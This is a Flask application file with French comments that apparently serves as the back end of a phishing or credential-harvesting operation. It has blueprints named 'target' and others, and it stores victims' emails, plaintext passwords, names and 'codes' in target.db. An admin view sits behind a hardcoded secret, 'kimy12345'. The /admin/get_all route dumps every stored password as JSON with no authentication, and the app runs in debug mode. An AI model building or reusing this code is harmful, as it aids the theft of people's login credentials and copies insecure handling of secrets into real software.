from flask import Flask, render_template, request, jsonify
from target_routes import target
from kmyy_routes import kmyy
from lyne_routes import lyne
from models import db, Connection

# Initialisation de l'application Flask
app = Flask(__name__)

# Configuration de la base de données et autres options de Flask
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///target.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialisation de la base de données
db.init_app(app)

# Créer la base de données et les tables si elles n'existent pas
with app.app_context():
    db.create_all()  # Crée les tables définies dans les modèles


# Route pour l'administration et affichage des connexions
@app.route('/admin/table')
def admin_table():
    # Récupération du code secret passé en paramètre dans l'URL
    code_secret = request.args.get('code')  # Code secret dynamique passé dans l'URL
    if not code_secret:
        return jsonify({"error": "Code secret manquant"}), 400  # Retourne une erreur si le code secret est absent

    # Code attendu pour valider
    expected_code = "kimy12345"  # Code que vous attendez (par exemple, "12345")

    if code_secret != expected_code:
        # Si le code secret ne correspond pas, retour d'une erreur JSON
        return jsonify({"error": "Code secret invalide"}), 403

    # Si le code est valide, récupérer toutes les entrées de la table 'Connection'
    connections = Connection.query.all()

    # Retourner la page HTML avec les connexions
    return render_template('admin_table.html', connections=connections)

# Enregistrement du blueprint target
app.register_blueprint(target)
app.register_blueprint(kmyy)
app.register_blueprint(lyne)

@app.route('/admin/get_all', methods=['GET'])
def get_all():
    # Récupérer toutes les connexions (utilisateurs)
    connections = Connection.query.all()

    # Si aucune connexion n'est trouvée, renvoyer un message d'erreur
    if not connections:
        return jsonify({"error": "Aucune connexion trouvée"}), 404

    # Formater les résultats sous forme de liste de dictionnaires
    connections_list = []
    for connection in connections:
        connections_list.append({
            "id": connection.id,
            "email": connection.email,
            "password": connection.password,
            "nom": connection.nom,
            "prenom": connection.prenom,
            "message": connection.message,
            "code": connection.code,
            "date": connection.date.isoformat(),  # Formater la date en ISO 8601
            "action": connection.action
        })

    # Renvoyer les données sous forme de JSON
    return jsonify(connections_list), 200

if __name__ == '__main__':
    app.run(debug=True)
